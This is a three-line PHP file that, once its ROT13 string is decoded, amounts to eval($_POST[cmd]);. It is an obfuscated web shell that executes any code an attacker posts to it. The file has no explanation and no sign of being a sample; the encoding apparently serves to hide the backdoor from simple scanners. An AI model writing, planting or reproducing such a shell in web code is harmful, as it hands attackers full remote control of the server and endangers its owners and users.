<?php
eval(str_rot13('riny($_CBFG[pzq]);'));
?>